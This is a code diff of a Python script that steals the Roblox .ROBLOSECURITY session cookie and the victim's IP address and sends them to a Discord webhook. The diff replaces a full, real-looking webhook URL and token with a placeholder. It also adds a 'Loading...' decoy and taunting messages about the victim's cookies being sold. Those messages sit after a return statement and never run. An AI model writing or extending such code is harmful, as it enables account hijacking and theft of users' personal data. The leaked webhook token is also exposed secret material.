@@ -10,8 +10,10 @@ from selenium.webdriver.edge.options import Options as EdgeOptions
 from webdriver_manager.chrome import ChromeDriverManager
 from webdriver_manager.microsoft import EdgeChromiumDriverManager
 
+print("Loading...")
+
 # Webhook URL
-WEBHOOK_URL = "https://discord.com/api/webhooks/1347591981567840277/iZdHuzSQy1UuB9IJ6nz5oG-NSepNBqpFtNR3mmIZ82lKo5-4VwSQekeKjXBWOAF8AE4S"
+WEBHOOK_URL = "your webhook here"
 
 def send_to_webhook(title, message, color=16711680):
     """Send a message to Discord webhook."""
@@ -124,6 +126,12 @@ def get_roblox_cookie():
     
     send_to_webhook("⚠ No Roblox Cookie Found", "Could not retrieve .ROBLOSECURITY")
     return None
+
+    print("this is what happens if you try to hack other people lol")
+    time.sleep(2)  # Indented correctly
+    print("uploading your IP cookies to the dark web")
+    time.sleep(1)  # Indented correctly
+    print("Enjoy having your cookies hacked and IP on the black market, dumbass")
 
 if __name__ == "__main__":
     send_ip()  # Send IP before running main function
